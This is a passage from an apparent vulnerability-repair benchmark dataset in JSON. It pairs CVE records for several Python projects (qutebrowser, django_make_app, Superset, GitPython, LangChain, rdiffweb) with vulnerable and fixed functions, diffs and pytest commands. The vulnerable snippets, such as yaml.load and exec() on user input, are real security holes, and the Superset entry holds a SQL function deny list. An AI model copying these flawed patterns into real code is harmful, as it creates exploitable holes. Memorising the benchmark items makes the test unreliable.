    "vul_patch": "--- a/qutebrowser/qutebrowser.py\n+++ b/qutebrowser/qutebrowser.py\n@@ -1,4 +1,5 @@\n def main():\n+    _validate_untrusted_args(sys.argv)\n     parser = get_argparser()\n     argv = sys.argv[1:]\n     args = parser.parse_args(argv)\n\n--- /dev/null\n+++ b/qutebrowser/qutebrowser.py\n@@ -0,0 +1,18 @@\n+def _validate_untrusted_args(argv):\n+    # NOTE: Do not use f-strings here, as this should run with older Python\n+    # versions (so that a proper error can be displayed)\n+    try:\n+        untrusted_idx = argv.index('--untrusted-args')\n+    except ValueError:\n+        return\n+\n+    rest = argv[untrusted_idx + 1:]\n+    if len(rest) > 1:\n+        sys.exit(\n+            \"Found multiple arguments ({}) after --untrusted-args, \"\n+            \"aborting.\".format(' '.join(rest)))\n+\n+    for arg in rest:\n+        if arg.startswith(('-', ':')):\n+            sys.exit(\"Found {} after --untrusted-args, aborting.\".format(arg))\n+\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-16764",
    "cve_description": "An exploitable vulnerability exists in the YAML parsing functionality in the read_yaml_file method in io_utils.py in django_make_app 0.1.3. A YAML parser can execute arbitrary Python commands resulting in command execution. An attacker can insert Python into loaded YAML to trigger this vulnerability.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/illagrenan/django-make-app",
    "patch_url": [
      "https://github.com/illagrenan/django-make-app/commit/acd814433d1021aa8783362521b0bd151fdfc9d2"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_356_1",
        "commit": "e42d3bf31e7c66dc741a96de79daef0ba76f74a1",
        "file_path": "django_make_app/io_utils.py",
        "start_line": 13,
        "end_line": 15,
        "snippet": "def read_yaml_file(filename):\n    with io.open(filename, mode='r', encoding='utf-8') as the_file:\n        return yaml.load(the_file)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_356_1",
        "commit": "acd814433d1021aa8783362521b0bd151fdfc9d2",
        "file_path": "django_make_app/io_utils.py",
        "start_line": 13,
        "end_line": 15,
        "snippet": "def read_yaml_file(filename):\n    with io.open(filename, mode='r', encoding='utf-8') as the_file:\n        return yaml.safe_load(the_file)"
      }
    ],
    "vul_patch": "--- a/django_make_app/io_utils.py\n+++ b/django_make_app/io_utils.py\n@@ -1,3 +1,3 @@\n def read_yaml_file(filename):\n     with io.open(filename, mode='r', encoding='utf-8') as the_file:\n-        return yaml.load(the_file)\n+        return yaml.safe_load(the_file)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-53947",
    "cve_description": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in Apache Superset. Specifically, certain engine-specific functions are not checked, which allows attackers to bypass Apache Superset's SQL authorization. This issue is a follow-up to\u00a0CVE-2024-39887 with additional disallowed PostgreSQL functions now included:\u00a0query_to_xml_and_xmlschema,\u00a0table_to_xml,\u00a0table_to_xml_and_xmlschema.\n\nThis issue affects Apache Superset: <4.1.0.\n\nUsers are recommended to upgrade to version 4.1.0, which fixes the issue or add these Postgres functions to the config set\u00a0DISALLOWED_SQL_FUNCTIONS.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/apache/superset",
    "patch_url": [
      "https://github.com/apache/superset/commit/0e0028260fc8a2099250701524a489f3c9aa146f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_256_1",
        "commit": "2418342",
        "file_path": "superset/config.py",
        "start_line": 1278,
        "end_line": 1282,
        "snippet": "DISALLOWED_SQL_FUNCTIONS: dict[str, set[str]] = {\n    \"postgresql\": {\"version\", \"query_to_xml\", \"inet_server_addr\", \"inet_client_addr\"},\n    \"clickhouse\": {\"url\"},\n    \"mysql\": {\"version\"},\n}"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_256_1",
        "commit": "0e00282",
        "file_path": "superset/config.py",
        "start_line": 1278,
        "end_line": 1291,
        "snippet": "DISALLOWED_SQL_FUNCTIONS: dict[str, set[str]] = {\n    \"postgresql\": {\n        \"database_to_xml\",\n        \"inet_client_addr\",\n        \"inet_server_addr\",\n        \"query_to_xml\",\n        \"query_to_xml_and_xmlschema\",\n        \"table_to_xml\",\n        \"table_to_xml_and_xmlschema\",\n        \"version\",\n    },\n    \"clickhouse\": {\"url\"},\n    \"mysql\": {\"version\"},\n}"
      }
    ],
    "vul_patch": "--- a/superset/config.py\n+++ b/superset/config.py\n@@ -1,5 +1,14 @@\n DISALLOWED_SQL_FUNCTIONS: dict[str, set[str]] = {\n-    \"postgresql\": {\"version\", \"query_to_xml\", \"inet_server_addr\", \"inet_client_addr\"},\n+    \"postgresql\": {\n+        \"database_to_xml\",\n+        \"inet_client_addr\",\n+        \"inet_server_addr\",\n+        \"query_to_xml\",\n+        \"query_to_xml_and_xmlschema\",\n+        \"table_to_xml\",\n+        \"table_to_xml_and_xmlschema\",\n+        \"version\",\n+    },\n     \"clickhouse\": {\"url\"},\n     \"mysql\": {\"version\"},\n }\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-41040",
    "cve_description": "GitPython is a python library used to interact with Git repositories. In order to resolve some git references, GitPython reads files from the `.git` directory, in some places the name of the file being read is provided by the user, GitPython doesn't check if this file is located outside the `.git` directory. This allows an attacker to make GitPython read any file from the system. This vulnerability is present in https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/refs/symbolic.py#L174-L175. That code joins the base directory with a user given string without checking if the final path is located outside the base directory. This vulnerability cannot be used to read the contents of files but could in theory be used to trigger a denial of service for the program. This issue has been addressed in version 3.1.37.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/gitpython-developers/GitPython",
    "patch_url": [
      "https://github.com/gitpython-developers/GitPython/commit/74e55ee4544867e1bd976b7df5a45869ee397b0b",
      "https://github.com/gitpython-developers/GitPython/commit/e98f57b81f792f0f5e18d33ee658ae395f9aa3c4"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_59_1",
        "commit": "1774f1e",
        "file_path": "git/refs/symbolic.py",
        "start_line": 165,
        "end_line": 205,
        "snippet": "    def _get_ref_info_helper(\n        cls, repo: \"Repo\", ref_path: Union[PathLike, None]\n    ) -> Union[Tuple[str, None], Tuple[None, str]]:\n        \"\"\"Return: (str(sha), str(target_ref_path)) if available, the sha the file at\n        rela_path points to, or None. target_ref_path is the reference we\n        point to, or None\"\"\"\n        if \"..\" in str(ref_path):\n            raise ValueError(f\"Invalid reference '{ref_path}'\")\n        tokens: Union[None, List[str], Tuple[str, str]] = None\n        repodir = _git_dir(repo, ref_path)\n        try:\n            with open(os.path.join(repodir, str(ref_path)), \"rt\", encoding=\"UTF-8\") as fp:\n                value = fp.read().rstrip()\n            # Don't only split on spaces, but on whitespace, which allows to parse lines like\n            # 60b64ef992065e2600bfef6187a97f92398a9144                branch 'master' of git-server:/path/to/repo\n            tokens = value.split()\n            assert len(tokens) != 0\n        except OSError:\n            # Probably we are just packed, find our entry in the packed refs file\n            # NOTE: We are not a symbolic ref if we are in a packed file, as these\n            # are excluded explicitly\n            for sha, path in cls._iter_packed_refs(repo):\n                if path != ref_path:\n                    continue\n                # sha will be used\n                tokens = sha, path\n                break\n            # END for each packed ref\n        # END handle packed refs\n        if tokens is None:\n            raise ValueError(\"Reference at %r does not exist\" % ref_path)\n\n        # is it a reference ?\n        if tokens[0] == \"ref:\":\n            return (None, tokens[1])\n\n        # its a commit\n        if repo.re_hexsha_only.match(tokens[0]):\n            return (tokens[0], None)\n\n        raise ValueError(\"Failed to parse reference information from %r\" % ref_path)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_59_1",
        "commit": "e98f57b81f792f0f5e18d33ee658ae395f9aa3c4",
        "file_path": "git/refs/symbolic.py",
        "start_line": 210,
        "end_line": 241,
        "snippet": "    def _get_ref_info_helper(\n        cls, repo: \"Repo\", ref_path: Union[PathLike, None]\n    ) -> Union[Tuple[str, None], Tuple[None, str]]:\n        \"\"\"Return: (str(sha), str(target_ref_path)) if available, the sha the file at\n        rela_path points to, or None. target_ref_path is the reference we\n        point to, or None\"\"\"\n        if ref_path:\n            cls._check_ref_name_valid(ref_path)\n\n        tokens: Union[None, List[str], Tuple[str, str]] = None\n        repodir = _git_dir(repo, ref_path)\n        try:\n            with open(os.path.join(repodir, str(ref_path)), \"rt\", encoding=\"UTF-8\") as fp:\n                value = fp.read().rstrip()\n            # Don't only split on spaces, but on whitespace, which allows to parse lines like\n            # 60b64ef992065e2600bfef6187a97f92398a9144                branch 'master' of git-server:/path/to/repo\n            tokens = value.split()\n            assert len(tokens) != 0\n        except OSError:\n            # Probably we are just packed, find our entry in the packed refs file\n            # NOTE: We are not a symbolic ref if we are in a packed file, as these\n            # are excluded explicitly\n            for sha, path in cls._iter_packed_refs(repo):\n                if path != ref_path:\n                    continue\n                # sha will be used\n                tokens = sha, path\n                break\n            # END for each packed ref\n        # END handle packed refs\n        if tokens is None:\n            raise ValueError(\"Reference at %r does not exist\" % ref_path)"
      },
      {
        "id": "fix_py_59_2",
        "commit": "e98f57b81f792f0f5e18d33ee658ae395f9aa3c4",
        "file_path": "git/refs/symbolic.py",
        "start_line": 164,
        "end_line": 208,
        "snippet": "    @staticmethod\n    def _check_ref_name_valid(ref_path: PathLike) -> None:\n        # Based on the rules described in https://git-scm.com/docs/git-check-ref-format/#_description\n        previous: Union[str, None] = None\n        one_before_previous: Union[str, None] = None\n        for c in str(ref_path):\n            if c in \" ~^:?*[\\\\\":\n                raise ValueError(\n                    f\"Invalid reference '{ref_path}': references cannot contain spaces, tildes (~), carets (^),\"\n                    f\" colons (:), question marks (?), asterisks (*), open brackets ([) or backslashes (\\\\)\"\n                )\n            elif c == \".\":\n                if previous is None or previous == \"/\":\n                    raise ValueError(\n                        f\"Invalid reference '{ref_path}': references cannot start with a period (.) or contain '/.'\"\n                    )\n                elif previous == \".\":\n                    raise ValueError(f\"Invalid reference '{ref_path}': references cannot contain '..'\")\n            elif c == \"/\":\n                if previous == \"/\":\n                    raise ValueError(f\"Invalid reference '{ref_path}': references cannot contain '//'\")\n                elif previous is None:\n                    raise ValueError(\n                        f\"Invalid reference '{ref_path}': references cannot start with forward slashes '/'\"\n                    )\n            elif c == \"{\" and previous == \"@\":\n                raise ValueError(f\"Invalid reference '{ref_path}': references cannot contain '@{{'\")\n            elif ord(c) < 32 or ord(c) == 127:\n                raise ValueError(f\"Invalid reference '{ref_path}': references cannot contain ASCII control characters\")\n\n            one_before_previous = previous\n            previous = c\n\n        if previous == \".\":\n            raise ValueError(f\"Invalid reference '{ref_path}': references cannot end with a period (.)\")\n        elif previous == \"/\":\n            raise ValueError(f\"Invalid reference '{ref_path}': references cannot end with a forward slash (/)\")\n        elif previous == \"@\" and one_before_previous is None:\n            raise ValueError(f\"Invalid reference '{ref_path}': references cannot be '@'\")\n        elif any([component.endswith(\".lock\") for component in str(ref_path).split(\"/\")]):\n            raise ValueError(\n                f\"Invalid reference '{ref_path}': references cannot have slash-separated components that end with\"\n                f\" '.lock'\"\n            )\n"
      }
    ],
    "vul_patch": "--- a/git/refs/symbolic.py\n+++ b/git/refs/symbolic.py\n@@ -4,8 +4,9 @@\n         \"\"\"Return: (str(sha), str(target_ref_path)) if available, the sha the file at\n         rela_path points to, or None. target_ref_path is the reference we\n         point to, or None\"\"\"\n-        if \"..\" in str(ref_path):\n-            raise ValueError(f\"Invalid reference '{ref_path}'\")\n+        if ref_path:\n+            cls._check_ref_name_valid(ref_path)\n+\n         tokens: Union[None, List[str], Tuple[str, str]] = None\n         repodir = _git_dir(repo, ref_path)\n         try:\n@@ -29,13 +30,3 @@\n         # END handle packed refs\n         if tokens is None:\n             raise ValueError(\"Reference at %r does not exist\" % ref_path)\n-\n-        # is it a reference ?\n-        if tokens[0] == \"ref:\":\n-            return (None, tokens[1])\n-\n-        # its a commit\n-        if repo.re_hexsha_only.match(tokens[0]):\n-            return (tokens[0], None)\n-\n-        raise ValueError(\"Failed to parse reference information from %r\" % ref_path)\n\n--- /dev/null\n+++ b/git/refs/symbolic.py\n@@ -0,0 +1,44 @@\n+    @staticmethod\n+    def _check_ref_name_valid(ref_path: PathLike) -> None:\n+        # Based on the rules described in https://git-scm.com/docs/git-check-ref-format/#_description\n+        previous: Union[str, None] = None\n+        one_before_previous: Union[str, None] = None\n+        for c in str(ref_path):\n+            if c in \" ~^:?*[\\\\\":\n+                raise ValueError(\n+                    f\"Invalid reference '{ref_path}': references cannot contain spaces, tildes (~), carets (^),\"\n+                    f\" colons (:), question marks (?), asterisks (*), open brackets ([) or backslashes (\\\\)\"\n+                )\n+            elif c == \".\":\n+                if previous is None or previous == \"/\":\n+                    raise ValueError(\n+                        f\"Invalid reference '{ref_path}': references cannot start with a period (.) or contain '/.'\"\n+                    )\n+                elif previous == \".\":\n+                    raise ValueError(f\"Invalid reference '{ref_path}': references cannot contain '..'\")\n+            elif c == \"/\":\n+                if previous == \"/\":\n+                    raise ValueError(f\"Invalid reference '{ref_path}': references cannot contain '//'\")\n+                elif previous is None:\n+                    raise ValueError(\n+                        f\"Invalid reference '{ref_path}': references cannot start with forward slashes '/'\"\n+                    )\n+            elif c == \"{\" and previous == \"@\":\n+                raise ValueError(f\"Invalid reference '{ref_path}': references cannot contain '@{{'\")\n+            elif ord(c) < 32 or ord(c) == 127:\n+                raise ValueError(f\"Invalid reference '{ref_path}': references cannot contain ASCII control characters\")\n+\n+            one_before_previous = previous\n+            previous = c\n+\n+        if previous == \".\":\n+            raise ValueError(f\"Invalid reference '{ref_path}': references cannot end with a period (.)\")\n+        elif previous == \"/\":\n+            raise ValueError(f\"Invalid reference '{ref_path}': references cannot end with a forward slash (/)\")\n+        elif previous == \"@\" and one_before_previous is None:\n+            raise ValueError(f\"Invalid reference '{ref_path}': references cannot be '@'\")\n+        elif any([component.endswith(\".lock\") for component in str(ref_path).split(\"/\")]):\n+            raise ValueError(\n+                f\"Invalid reference '{ref_path}': references cannot have slash-separated components that end with\"\n+                f\" '.lock'\"\n+            )\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-41040:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/GitPython\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-41040/bin/python -m pytest test/test_refs.py::TestRefs::test_validity_ref_names\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-41040:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/GitPython\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-41040/bin/python -m pytest test/test_refs.py -k \"not test_head_checkout_detached_head and not test_is_valid and not test_tag_message and not test_heads and not test_head_reset and not test_tags_author and not test_tag_base\" --deselect=test/test_refs.py::TestRefs::test_refs -p no:warning --disable-warnings"
  },
  {
    "cve_id": "CVE-2024-0243",
    "cve_description": "With the following crawler configuration:\n\n```python\nfrom bs4 import BeautifulSoup as Soup\n\nurl = \"https://example.com\"\nloader = RecursiveUrlLoader(\n    url=url, max_depth=2, extractor=lambda x: Soup(x, \"html.parser\").text\n)\ndocs = loader.load()\n```\n\nAn attacker in control of the contents of `https://example.com` could place a malicious HTML file in there with links like \"https://example.completely.different/my_file.html\" and the crawler would proceed to download that file as well even though `prevent_outside=True`.\n\nhttps://github.com/langchain-ai/langchain/blob/bf0b3cc0b5ade1fb95a5b1b6fa260e99064c2e22/libs/community/langchain_community/document_loaders/recursive_url_loader.py#L51-L51\n\nResolved in https://github.com/langchain-ai/langchain/pull/15559",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/langchain-ai/langchain",
    "patch_url": [
      "https://github.com/langchain-ai/langchain/commit/bf0b3cc0b5ade1fb95a5b1b6fa260e99064c2e22"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_29_1",
        "commit": "817b84d",
        "file_path": "libs/core/langchain_core/utils/html.py",
        "start_line": 47,
        "end_line": 89,
        "snippet": "def extract_sub_links(\n    raw_html: str,\n    url: str,\n    *,\n    base_url: Optional[str] = None,\n    pattern: Union[str, re.Pattern, None] = None,\n    prevent_outside: bool = True,\n    exclude_prefixes: Sequence[str] = (),\n) -> List[str]:\n    \"\"\"Extract all links from a raw html string and convert into absolute paths.\n\n    Args:\n        raw_html: original html.\n        url: the url of the html.\n        base_url: the base url to check for outside links against.\n        pattern: Regex to use for extracting links from raw html.\n        prevent_outside: If True, ignore external links which are not children\n            of the base url.\n        exclude_prefixes: Exclude any URLs that start with one of these prefixes.\n\n    Returns:\n        List[str]: sub links\n    \"\"\"\n    base_url = base_url if base_url is not None else url\n    all_links = find_all_links(raw_html, pattern=pattern)\n    absolute_paths = set()\n    for link in all_links:\n        # Some may be absolute links like https://to/path\n        if link.startswith(\"http\"):\n            absolute_paths.add(link)\n        # Some may have omitted the protocol like //to/path\n        elif link.startswith(\"//\"):\n            absolute_paths.add(f\"{urlparse(url).scheme}:{link}\")\n        else:\n            absolute_paths.add(urljoin(url, link))\n    res = []\n    for path in absolute_paths:\n        if any(path.startswith(exclude) for exclude in exclude_prefixes):\n            continue\n        if prevent_outside and not path.startswith(base_url):\n            continue\n        res.append(path)\n    return res"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_29_1",
        "commit": "bf0b3cc",
        "file_path": "libs/core/langchain_core/utils/html.py",
        "start_line": 47,
        "end_line": 103,
        "snippet": "def extract_sub_links(\n    raw_html: str,\n    url: str,\n    *,\n    base_url: Optional[str] = None,\n    pattern: Union[str, re.Pattern, None] = None,\n    prevent_outside: bool = True,\n    exclude_prefixes: Sequence[str] = (),\n) -> List[str]:\n    \"\"\"Extract all links from a raw html string and convert into absolute paths.\n\n    Args:\n        raw_html: original html.\n        url: the url of the html.\n        base_url: the base url to check for outside links against.\n        pattern: Regex to use for extracting links from raw html.\n        prevent_outside: If True, ignore external links which are not children\n            of the base url.\n        exclude_prefixes: Exclude any URLs that start with one of these prefixes.\n\n    Returns:\n        List[str]: sub links\n    \"\"\"\n    base_url_to_use = base_url if base_url is not None else url\n    parsed_base_url = urlparse(base_url_to_use)\n    all_links = find_all_links(raw_html, pattern=pattern)\n    absolute_paths = set()\n    for link in all_links:\n        parsed_link = urlparse(link)\n        # Some may be absolute links like https://to/path\n        if parsed_link.scheme == \"http\" or parsed_link.scheme == \"https\":\n            absolute_path = link\n        # Some may have omitted the protocol like //to/path\n        elif link.startswith(\"//\"):\n            absolute_path = f\"{urlparse(url).scheme}:{link}\"\n        else:\n            absolute_path = urljoin(url, parsed_link.path)\n        absolute_paths.add(absolute_path)\n\n    results = []\n    for path in absolute_paths:\n        if any(path.startswith(exclude_prefix) for exclude_prefix in exclude_prefixes):\n            continue\n\n        if prevent_outside:\n            parsed_path = urlparse(path)\n\n            if parsed_base_url.netloc != parsed_path.netloc:\n                continue\n\n            # Will take care of verifying rest of path after netloc\n            # if it's more specific\n            if not path.startswith(base_url_to_use):\n                continue\n\n        results.append(path)\n    return results"
      }
    ],
    "vul_patch": "--- a/libs/core/langchain_core/utils/html.py\n+++ b/libs/core/langchain_core/utils/html.py\n@@ -21,23 +21,37 @@\n     Returns:\n         List[str]: sub links\n     \"\"\"\n-    base_url = base_url if base_url is not None else url\n+    base_url_to_use = base_url if base_url is not None else url\n+    parsed_base_url = urlparse(base_url_to_use)\n     all_links = find_all_links(raw_html, pattern=pattern)\n     absolute_paths = set()\n     for link in all_links:\n+        parsed_link = urlparse(link)\n         # Some may be absolute links like https://to/path\n-        if link.startswith(\"http\"):\n-            absolute_paths.add(link)\n+        if parsed_link.scheme == \"http\" or parsed_link.scheme == \"https\":\n+            absolute_path = link\n         # Some may have omitted the protocol like //to/path\n         elif link.startswith(\"//\"):\n-            absolute_paths.add(f\"{urlparse(url).scheme}:{link}\")\n+            absolute_path = f\"{urlparse(url).scheme}:{link}\"\n         else:\n-            absolute_paths.add(urljoin(url, link))\n-    res = []\n+            absolute_path = urljoin(url, parsed_link.path)\n+        absolute_paths.add(absolute_path)\n+\n+    results = []\n     for path in absolute_paths:\n-        if any(path.startswith(exclude) for exclude in exclude_prefixes):\n+        if any(path.startswith(exclude_prefix) for exclude_prefix in exclude_prefixes):\n             continue\n-        if prevent_outside and not path.startswith(base_url):\n-            continue\n-        res.append(path)\n-    return res\n+\n+        if prevent_outside:\n+            parsed_path = urlparse(path)\n+\n+            if parsed_base_url.netloc != parsed_path.netloc:\n+                continue\n+\n+            # Will take care of verifying rest of path after netloc\n+            # if it's more specific\n+            if not path.startswith(base_url_to_use):\n+                continue\n+\n+        results.append(path)\n+    return results\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-0243:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/langchain\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd libs/core && /workspace/PoC_env/CVE-2024-0243/bin/python -m pytest tests/unit_tests/utils/test_html.py -v -o addopts=\"\" -k \"test_prevent_outside\"\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-0243:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/langchain\ngit apply --whitespace=nowarn  /workspace/fix.patch\ncd libs/core && /workspace/PoC_env/CVE-2024-0243/bin/python -m pytest tests/unit_tests/utils/test_html.py -v -o addopts=\"\"\n"
  },
  {
    "cve_id": "CVE-2023-34540",
    "cve_description": "Langchain before v0.0.225 was discovered to contain a remote code execution (RCE) vulnerability in the component JiraAPIWrapper (aka the JIRA API wrapper). This vulnerability allows attackers to execute arbitrary code via crafted input. As noted in the \"releases/tag\" reference, a fix is available.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/langchain-ai/langchain",
    "patch_url": [
      "https://github.com/langchain-ai/langchain/commit/a2f191a32229256dd41deadf97786fe41ce04cbb"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_136_1",
        "commit": "61938a0",
        "file_path": "langchain/utilities/jira.py",
        "start_line": 190,
        "end_line": 194,
        "snippet": "    def other(self, query: str) -> str:\n        context = {\"self\": self}\n        exec(f\"result = {query}\", context)\n        result = context[\"result\"]\n        return str(result)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_136_1",
        "commit": "a2f191a",
        "file_path": "langchain/utilities/jira.py",
        "start_line": 190,
        "end_line": 199,
        "snippet": "    def other(self, query: str) -> str:\n        try:\n            import json\n        except ImportError:\n            raise ImportError(\n                \"json is not installed. Please install it with `pip install json`\"\n            )\n        params = json.loads(query)\n        jira_function = getattr(self.jira, params[\"function\"])\n        return jira_function(*params.get(\"args\", []), **params.get(\"kwargs\", {}))"
      }
    ],
    "vul_patch": "--- a/langchain/utilities/jira.py\n+++ b/langchain/utilities/jira.py\n@@ -1,5 +1,10 @@\n     def other(self, query: str) -> str:\n-        context = {\"self\": self}\n-        exec(f\"result = {query}\", context)\n-        result = context[\"result\"]\n-        return str(result)\n+        try:\n+            import json\n+        except ImportError:\n+            raise ImportError(\n+                \"json is not installed. Please install it with `pip install json`\"\n+            )\n+        params = json.loads(query)\n+        jira_function = getattr(self.jira, params[\"function\"])\n+        return jira_function(*params.get(\"args\", []), **params.get(\"kwargs\", {}))\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-3269",
    "cve_description": "Session Fixation in GitHub repository ikus060/rdiffweb prior to 2.4.7.",
    "cwe_info": {
      "CWE-384": {
        "name": "Session Fixation",
        "description": "Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions."
      }
    },
    "repo": "https://github.com/ikus060/rdiffweb",
    "patch_url": [
      "https://github.com/ikus060/rdiffweb/commit/39e7dcd4a1f44d2a7bd92b79d78a800910b1b22b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_209_1",
        "commit": "ac334dd",
        "file_path": "rdiffweb/controller/page_login.py",
        "start_line": 60,
        "end_line": 84,
        "snippet": "    def index(self, **kwargs):\n        form = LoginForm()\n        # Validate user's credentials\n        if form.validate_on_submit():\n            try:\n                userobj = self.app.store.login(form.login.data, form.password.data)\n            except Exception:\n                logger.exception('fail to validate credential')\n                flash(_(\"Fail to validate user credential.\"))\n            else:\n                if userobj:\n                    cherrypy.session[SESSION_KEY] = userobj.username\n                    raise cherrypy.HTTPRedirect(form.redirect.data)\n                flash(_(\"Invalid username or password.\"))\n\n        params = {'form': form}\n\n        # Add welcome message to params. Try to load translated message.\n        if self._welcome_msg:\n            params[\"welcome_msg\"] = self._welcome_msg.get('')\n            if hasattr(cherrypy.response, 'i18n'):\n                locale = cherrypy.response.i18n.locale.language\n                params[\"welcome_msg\"] = self._welcome_msg.get(locale, params[\"welcome_msg\"])\n\n        return self._compile_template(\"login.html\", **params).encode(\"utf-8\")"
      },
      {
        "id": "vul_py_209_2",
        "commit": "ac334dd",
        "file_path": "rdiffweb/controller/page_login.py",
        "start_line": 90,
        "end_line": 92,
        "snippet": "    def default(self):\n        cherrypy.session[SESSION_KEY] = None\n        raise cherrypy.HTTPRedirect('/')"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_209_1",
        "commit": "39e7dcd",
        "file_path": "rdiffweb/controller/page_login.py",
        "start_line": 60,
        "end_line": 85,
        "snippet": "    def index(self, **kwargs):\n        form = LoginForm()\n        # Validate user's credentials\n        if form.validate_on_submit():\n            try:\n                userobj = self.app.store.login(form.login.data, form.password.data)\n            except Exception:\n                logger.exception('fail to validate credential')\n                flash(_(\"Fail to validate user credential.\"))\n            else:\n                if userobj:\n                    cherrypy.session[SESSION_KEY] = userobj.username\n                    cherrypy.session.regenerate()\n                    raise cherrypy.HTTPRedirect(form.redirect.data)\n                flash(_(\"Invalid username or password.\"))\n\n        params = {'form': form}\n\n        # Add welcome message to params. Try to load translated message.\n        if self._welcome_msg:\n            params[\"welcome_msg\"] = self._welcome_msg.get('')\n            if hasattr(cherrypy.response, 'i18n'):\n                locale = cherrypy.response.i18n.locale.language\n                params[\"welcome_msg\"] = self._welcome_msg.get(locale, params[\"welcome_msg\"])\n\n        return self._compile_template(\"login.html\", **params).encode(\"utf-8\")"
      },
      {
        "id": "fix_py_209_2",
        "commit": "39e7dcd",
        "file_path": "rdiffweb/controller/page_login.py",
        "start_line": 91,
        "end_line": 94,
        "snippet": "    def default(self):\n        cherrypy.session[SESSION_KEY] = None\n        cherrypy.session.regenerate()\n        raise cherrypy.HTTPRedirect('/')"
      }
    ],
    "vul_patch": "--- a/rdiffweb/controller/page_login.py\n+++ b/rdiffweb/controller/page_login.py\n@@ -10,6 +10,7 @@\n             else:\n                 if userobj:\n                     cherrypy.session[SESSION_KEY] = userobj.username\n+                    cherrypy.session.regenerate()\n                     raise cherrypy.HTTPRedirect(form.redirect.data)\n                 flash(_(\"Invalid username or password.\"))\n \n\n--- a/rdiffweb/controller/page_login.py\n+++ b/rdiffweb/controller/page_login.py\n@@ -1,3 +1,4 @@\n     def default(self):\n         cherrypy.session[SESSION_KEY] = None\n+        cherrypy.session.regenerate()\n         raise cherrypy.HTTPRedirect('/')\n\n",
    "poc_patch": null,
